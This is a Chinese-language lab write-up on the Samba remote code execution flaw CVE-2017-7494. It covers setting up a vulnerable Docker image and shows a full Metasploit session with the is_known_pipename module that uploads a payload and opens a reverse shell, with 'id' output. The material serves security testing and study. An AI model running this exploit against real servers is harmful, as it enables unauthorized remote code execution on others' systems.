Samba远程代码执行漏洞(CVE-2017-7494)
---

### 漏洞信息

2017年5月24日Samba发布了4.6.4版本，中间修复了一个严重的远程代码执行漏洞，漏洞编号CVE-2017-7494，漏洞影响了Samba 3.5.0 之后到4.6.4/4.5.10/4.4.14中间的所有版本。

* [Remote code execution from a writable share.](https://www.samba.org/samba/security/CVE-2017-7494.html)

### 镜像信息

类型 | 值
:-:|:-:
samba 端口 | 445

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:s_samba_1
 ```

2. 启动环境

 ```
$ docker run -d -p 445:445 -p 139:139 -p 138:138 -p 137:137 medicean/vulapps:s_samba_1
 ```
 > `-p 445:445` 前面的 445 代表物理机的端口
 >

### 利用步骤

假定目标 IP 是： 192.168.35.197

```
msf > use exploit/linux/samba/is_known_pipename
msf exploit(is_known_pipename) > set RHOST 192.168.35.197
RHOST => 192.168.35.197
msf exploit(is_known_pipename) > show options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOST           192.168.35.197   yes       The target address
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_BASE                   no        The remote filesystem path correlating with the SMB share name
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   2   Linux x86_64


msf exploit(is_known_pipename) > run

[*] Started reverse TCP handler on 192.168.35.197:4444
[*] 192.168.35.197:445 - Using location \\192.168.35.197\share\ for the path
[*] 192.168.35.197:445 - Payload is stored in //192.168.35.197/share/ as dDUJiiuf.so
[*] 192.168.35.197:445 - Trying location /volume1/dDUJiiuf.so...
[*] 192.168.35.197:445 - Trying location /volume1/share/dDUJiiuf.so...
[*] 192.168.35.197:445 - Trying location /volume1/Share/dDUJiiuf.so...
[*] 192.168.35.197:445 - Trying location /mnt/media/SHARE/dDUJiiuf.so...
[*] 192.168.35.197:445 - Trying location /mnt/media/Share/dDUJiiuf.so...
[*] 192.168.35.197:445 - Trying location /var/samba/share/dDUJiiuf.so...
[*] 192.168.35.197:445 - Trying location /var/samba/SHARE/dDUJiiuf.so...
[*] 192.168.35.197:445 - Trying location /var/samba/Share/dDUJiiuf.so...
[*] 192.168.35.197:445 - Trying location /tmp/dDUJiiuf.so...
[*] Command shell session 1 opened (192.168.35.197:4444 -> 192.168.35.197:58089) at 2017-05-25 13:26:19 +0800

id
uid=65534(nobody) gid=0(root) groups=0(root),65534(nogroup)
```

如果 smb.conf 配置了 `guest account = root` 这一项, 则显示如下：

```
id
uid=0(root) gid=0(root) groups=0(root)
```

### 推荐阅读

* [First crack at Samba CVE-2017-7494 #8450](https://github.com/rapid7/metasploit-framework/pull/8450)
* [Samba远程代码执行漏洞(CVE-2017-7494)分析](http://blogs.360.cn/blog/samba%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2017-7494%E5%88%86%E6%9E%90/)